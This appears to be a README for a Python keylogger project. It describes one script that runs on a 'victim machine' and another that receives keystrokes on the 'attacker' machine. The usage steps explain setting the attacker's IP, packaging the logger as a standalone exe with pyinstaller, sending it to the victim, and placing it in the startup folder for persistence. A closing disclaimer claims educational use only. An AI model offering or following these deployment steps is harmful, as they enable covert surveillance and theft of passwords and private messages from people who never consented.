
# Keylogger

simple keylogger application for educational purpose

+ keylog.py    -  for victim machine

+ keylogrec.py -  for attacker

#### Dependencies needed

- [ ] pynput

- [ ] socket

- [ ] pyinstaller

- [ ] python interpretor (latest version)

## Usage
### method 1

step 1: clone the repo 

step 2: replace the ipaddress by attacker's ip address in both files

step 3: run `keylog.py` in victim machine

step 4: run `keylogrec.py` in attacker machine

step 5: monitor the terminal/output space in attacker machine

step 6: Well Done👍 dude


### method 2

step 1: clone the repo 

step 2: replace the ipaddress by attacker's ip address in both files

step 3: use ** pyinstaller ** to build the program into a executable file(dependencies included Automatically)

To build the exe file

1. use the below command in your machine
##
                pip install pyinstaller


2. run `pyinstaller --onefile {filename}`  #keylog.py
##
    pyinstaller --onefile keylog.py
    
3. open `dist` folder in the cloned file location

4. exe file build successfully

step 4: send the exe file(keylog.exe) to the victim machine

step 5: run the `keylog.exe` file in victim machine or place it in starup apps folder 

step 6: run `keylogrec.py` in attacker machine

step 7: monitor the terminal/output space in attacker machine

step 8: Well Done👍 dude


### Disclaimer

This Program is intended for educational use only. Unauthorized use of this software to monitor devices without explicit permission is illegal and prohibited. Users are responsible for ensuring compliance with all applicable laws and regulations. The developer is not liable for any misuse or resulting damages. Use at your own risk.
